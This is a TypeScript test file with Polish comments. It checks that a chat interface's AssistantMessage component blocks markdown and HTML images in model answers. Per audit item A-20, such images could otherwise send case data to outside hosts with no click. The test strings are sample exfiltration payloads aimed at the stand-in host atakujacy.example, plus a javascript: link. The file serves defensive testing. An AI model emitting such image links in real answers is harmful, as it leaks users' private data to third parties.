// Audyt 2026-09, A-20: odpowiedz modelu w czacie nie moze zamienic obrazu
// markdown na <img> z zewnetrznym src (zero-click eksfiltracja danych sprawy).
// Siatka regresji w domyslnej bramce `npm test` - czerwony test audytu lezy
// w audit-2609/ poza nia.
import { render } from "@testing-library/react";
import { describe, expect, it, vi } from "vitest";

vi.mock("@/lib/supabase", () => ({
    supabase: {
        auth: {
            getSession: async () => ({ data: { session: null } }),
            onAuthStateChange: () => ({
                data: { subscription: { unsubscribe: () => {} } },
            }),
        },
    },
}));

import { AssistantMessage } from "./AssistantMessage";

const LEAK = "Jan%20Testowy%2044051401458";

function renderAnswer(text: string) {
    return render(
        <AssistantMessage content="" events={[{ type: "content", text }]} />,
    );
}

describe("AssistantMessage - obraz markdown w odpowiedzi modelu (A-20)", () => {
    for (const [name, text] of [
        ["inline", `Podsumowanie.\n\n![logo](https://atakujacy.example/p.png?d=${LEAK})`],
        ["reference-style", `Tekst.\n\n![a][r]\n\n[r]: https://atakujacy.example/r.gif?d=${LEAK}`],
        ["protocol-relative", `![a](//atakujacy.example/x.gif?d=${LEAK})`],
        ["surowy HTML", `<img src="https://atakujacy.example/h.gif?d=${LEAK}">`],
    ] as const) {
        it(`${name}: brak <img>`, () => {
            const { container } = renderAnswer(text);
            expect(container.querySelectorAll("img")).toHaveLength(0);
        });
    }

    it("zablokowany obraz pokazuje tekst alt", () => {
        const { container } = renderAnswer(
            `![Wykres kosztow](https://atakujacy.example/p.png?d=${LEAK})`,
        );
        expect(
            container.querySelector("[data-markdown-image-blocked]")?.textContent,
        ).toContain("Wykres kosztow");
    });

    it("link: zachowany styl, rel=noopener noreferrer; javascript: nieaktywny", () => {
        const { container } = renderAnswer(
            "[ISAP](https://isap.sejm.gov.pl) oraz [zly](javascript:alert(1))",
        );
        const links = container.querySelectorAll("a");
        expect(links).toHaveLength(1);
        expect(links[0].getAttribute("rel")).toBe("noopener noreferrer");
        expect(links[0].className).toContain("text-bordeaux");
        expect(
            container.querySelector("[data-markdown-link-blocked]")?.textContent,
        ).toBe("zly");
    });
});
